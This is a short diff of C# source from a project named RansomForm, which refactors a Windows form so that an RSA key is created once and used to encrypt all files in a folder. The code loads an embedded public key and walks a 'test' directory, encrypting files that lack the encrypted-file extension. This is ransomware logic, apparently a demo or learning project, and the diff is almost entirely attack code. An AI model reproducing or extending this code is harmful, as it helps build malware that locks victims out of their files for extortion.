@@ -22,7 +22,10 @@ namespace RansomForm
     private byte[] privateKey;
     private byte[] publicKey;
 
-	public Form1()
+    RSACryptoServiceProvider RSA;
+
+
+    public Form1()
     {
       InitializeComponent();
     }
@@ -37,14 +40,14 @@ namespace RansomForm
     {
       publicKey = Properties.Resources.publickey;
       string folderpath = Directory.GetCurrentDirectory() + "\\test";
+      RSA = new RSACryptoServiceProvider(2048);
+      int bytesRead;
+      RSA.ImportRSAPublicKey(publicKey, out bytesRead);
       encryptFolder(folderpath);
     }
 
 	private void encryptFolder(string path)
     {
-      RSACryptoServiceProvider RSA = new RSACryptoServiceProvider(2048);
-      int bytesRead;
-      RSA.ImportRSAPublicKey(publicKey, out bytesRead);
       foreach (string f in Directory.GetFiles(path))
       {
         if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
